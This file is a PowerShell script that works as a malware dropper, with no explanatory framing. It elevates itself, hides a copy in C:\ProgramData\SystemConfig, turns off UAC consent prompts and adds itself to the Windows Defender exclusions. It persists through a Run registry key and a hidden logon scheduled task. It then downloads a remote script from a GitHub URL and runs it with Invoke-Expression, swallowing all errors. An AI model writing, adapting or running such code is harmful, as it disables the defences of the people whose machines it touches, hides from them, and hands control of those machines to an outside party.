# Check if the script is running with administrative privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try {
        # Relaunch the script with elevated privileges
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs -ErrorAction Stop
        exit 0
    }
    catch {
        # Suppress errors if elevation fails (e.g., user cancels UAC prompt)
        exit 1
    }
}

# Get the path of the current script
$originalScriptPath = $MyInvocation.MyCommand.Path
$scriptName = [System.IO.Path]::GetFileName($originalScriptPath)
$hiddenDir = "C:\ProgramData\SystemConfig"
$hiddenScriptPath = Join-Path -Path $hiddenDir -ChildPath $scriptName

try {
    # Create hidden directory if it doesn't exist
    if (-not (Test-Path -Path $hiddenDir)) {
        New-Item -Path $hiddenDir -ItemType Directory -ErrorAction Stop | Out-Null
        Set-ItemProperty -Path $hiddenDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop
    }

    # Copy the script to the hidden directory and mark it as hidden
    if (-not (Test-Path -Path $hiddenScriptPath)) {
        Copy-Item -Path $originalScriptPath -Destination $hiddenScriptPath -ErrorAction Stop | Out-Null
        Set-ItemProperty -Path $hiddenScriptPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop
    }
}
catch {
    # Suppress all errors
}

# --- Disable UAC Prompt ---
try {
    $uacRegistryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    $uacRegistryName = "ConsentPromptBehaviorAdmin"
    $uacValue = 0 # 0 = Elevate without prompting
    # Check if UAC is already disabled
    if ((Get-ItemProperty -Path $uacRegistryPath -Name $uacRegistryName -ErrorAction SilentlyContinue).$uacRegistryName -ne $uacValue) {
        Set-ItemProperty -Path $uacRegistryPath -Name $uacRegistryName -Value $uacValue -ErrorAction Stop | Out-Null
    }
}
catch {
    # Suppress all errors
}

# --- Add to Windows Defender Exclusions ---
try {
    # Check if the script path is already excluded
    $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
    if ($exclusions -notcontains $hiddenScriptPath) {
        Add-MpPreference -ExclusionPath $hiddenScriptPath -ErrorAction Stop | Out-Null
    }
    # Exclude the directory as well
    if ($exclusions -notcontains $hiddenDir) {
        Add-MpPreference -ExclusionPath $hiddenDir -ErrorAction Stop | Out-Null
    }
}
catch {
    # Suppress all errors
}

# --- Add to Registry Startup for All Users ---
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$registryName = [System.IO.Path]::GetFileNameWithoutExtension($scriptName)
$registryValue = "powershell.exe -ExecutionPolicy Bypass -File `"$hiddenScriptPath`" -WindowStyle Hidden"

try {
    # Check if the registry key already exists
    if (-not (Get-ItemProperty -Path $registryPath -Name $registryName -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $registryPath -Name $registryName -Value $registryValue -PropertyType String -ErrorAction Stop | Out-Null
    }
}
catch {
    # Suppress all errors
}

# --- Create Scheduled Task to Run at Login ---
$taskName = $registryName
$taskDescription = "Runs the $registryName PowerShell script at user login."
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$hiddenScriptPath`" -WindowStyle Hidden"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden

try {
    # Check if the scheduled task already exists
    if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description $taskDescription -ErrorAction Stop | Out-Null
    }
}
catch {
    # Suppress all errors
}

# --- Download and Execute External Script with Advanced Retry ---
try {
    $url = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/getexe.ps1"
    $maxRetries = 5
    $retryCount = 0
    $baseDelay = 1000 # Initial delay in milliseconds (1 second)
    $maxDelay = 30000 # Maximum delay in milliseconds (30 seconds)
    $success = $false

    while (-not $success -and $retryCount -lt $maxRetries) {
        try {
            $webClient = New-Object System.Net.WebClient
            $scriptContent = $webClient.DownloadString($url)
            $success = $true
            # Execute the downloaded script
            Invoke-Expression $scriptContent -ErrorAction Stop
        }
        catch {
            $retryCount++
            if ($retryCount -eq $maxRetries) {
                # Final attempt failed, exit silently
                break
            }
            # Calculate exponential backoff with jitter
            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
            $jitter = Get-Random -Minimum 0 -Maximum 100
            Start-Sleep -Milliseconds ($delay + $jitter)
        }
        finally {
            if ($webClient) { $webClient.Dispose() }
        }
    }
}
catch {
    # Suppress all errors
}
